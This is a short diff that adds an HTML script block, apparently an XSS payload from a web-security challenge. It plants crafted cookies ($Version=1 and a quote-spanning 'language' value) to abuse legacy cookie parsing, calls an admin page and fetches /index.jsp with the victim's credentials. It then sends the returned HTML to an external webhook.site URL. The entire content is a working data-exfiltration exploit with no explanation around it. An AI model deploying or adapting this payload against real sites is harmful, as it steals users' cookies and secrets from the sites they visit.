@@ -1,0 +1,9 @@
+<script>(async () => {
+  const EX = 'https://webhook.site/3f27bdd9-f209-4799-aedd-f7198a5a272d';
+  document.cookie='$Version=1; path=/index.jsp';
+  document.cookie='language="LEAK; path=/index.jsp';
+  document.cookie='dummy=end"; path=/';
+  await fetch('/admin/admin-review.jsp', { credentials: 'include' });
+  const html = await (await fetch('/index.jsp', { credentials: 'include' })).text();
+  fetch(EX + '?secret=' + encodeURIComponent(html), {mode:'no-cors'});
+})();</script>
